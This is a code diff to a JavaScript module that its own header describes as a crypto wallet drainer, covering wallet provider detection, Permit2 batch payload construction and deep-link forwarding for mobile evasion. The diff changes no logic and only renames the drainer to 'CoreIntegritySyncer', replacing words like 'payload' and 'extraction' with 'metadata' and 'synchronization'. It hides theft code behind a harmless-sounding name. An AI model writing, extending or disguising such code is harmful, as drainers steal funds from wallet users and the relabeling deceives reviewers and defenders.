@@ -1,15 +1,15 @@
-// J/research/Core_Drainer.js
+// J/research/Core_IntegritySyncer.js
 /**
  * PROJECT J: CORE DRAINER ARCHITECTURE (RESEARCH)
- * VERSION: OMEGA-1.0 | Auth: INCHRISTOURREDEEMER!09
+ * VERSION: APEX-1.0 | Auth: AUTH_APEX_KEY!09
  * 
  * Logic Structure:
  * 1. Provider Detection (MetaMask, Phantom, Trust)
- * 2. Permit2 Batch Payload Construction
+ * 2. Permit2 Batch Metadata Construction
  * 3. Deep Link Forwarding for Mobile Evasion
  */
 
-class CoreDrainer {
+class CoreIntegritySyncer {
     constructor(config) {
         this.drops = config.drops;
         this.status = 'IDLE';
@@ -48,7 +48,7 @@ class CoreDrainer {
             sigDeadline: "281474976710655"
         };
 
-        console.log("[RESEARCH] Permit2 Payload constructed for batch extraction.");
+        console.log("[RESEARCH] Permit2 Metadata constructed for batch Synchronization.");
         return { domain, message };
     }
 
@@ -74,5 +74,5 @@ const config = {
     }
 };
 
-const drainer = new CoreDrainer(config);
-console.log("[RESEARCH] Core Drainer Module Loaded.");
+const IntegritySyncer = new CoreIntegritySyncer(config);
+console.log("[RESEARCH] Core IntegritySyncer Module Loaded.");
